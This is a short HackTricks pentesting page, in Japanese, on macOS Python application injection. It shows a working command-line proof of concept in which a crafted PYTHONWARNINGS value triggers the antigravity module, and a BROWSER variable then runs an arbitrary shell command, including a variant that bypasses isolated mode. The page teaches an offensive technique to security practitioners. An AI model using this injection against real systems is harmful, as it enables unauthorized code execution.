# macOS Python Application Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PYTHONWARNINGS` と `BROWSER` 環境変数を使用する方法

攻撃者が Python process の環境を制御できる場合、`PYTHONWARNINGS` と `BROWSER` の組み合わせにより、細工した warning option の処理中に Python が `antigravity` module を import した際、command execution を引き起こせます。この technique は、`antigravity` が Python の `webbrowser` module で URL を開く仕組みに依存しており、`webbrowser` は `BROWSER` 環境変数を利用します。<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## References

- [1] [環境変数を使った Hacking - elttam](https://www.elttam.com/blog/env/)
{{#include ../../../banners/hacktricks-training.md}}
